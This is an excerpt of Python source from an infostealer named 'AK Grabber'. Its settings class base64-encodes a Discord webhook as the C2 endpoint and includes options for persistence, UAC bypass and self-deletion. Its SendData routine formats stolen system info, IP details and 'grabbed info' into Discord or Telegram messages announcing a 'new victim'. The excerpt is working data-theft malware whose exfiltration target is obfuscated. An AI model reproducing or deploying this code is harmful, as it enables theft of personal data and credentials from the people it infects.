...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NTIxNDcyNjg0OTY5MTY3Mi9kN2pyaUU0ZWkzc1lDSlZIdjdNcHd3VUltRHVCRWg0ZUcyYm9LMllGYUNERnB2bFYtZnJtYW4zUk1OS0E4TnUzQzJ0WQ==').decode())
    Mutex = base64.b64decode('N2IzTXNBTXQ1Y09teGZuQw==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('NA==').decode()
    ...
    def SendData(self) -> None:
        ...
        match Settings.C2[0]:
            case 0:
                ...
                payload = {'content': '||@everyone|| grabbed new victim  ' if Settings.PingMe else '', 'embeds': [{'title': 'AK Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/unknownchesspawn/AK-grabber', 'color': 34303, 'footer': {'text': 'Grabbed by AK Grabber | https://github.com/unknownchesspawn/AK-grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'AK', 'avatar_url': image_url}
            ...
            case 1:
                payload = {'caption': f'<b>AK Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
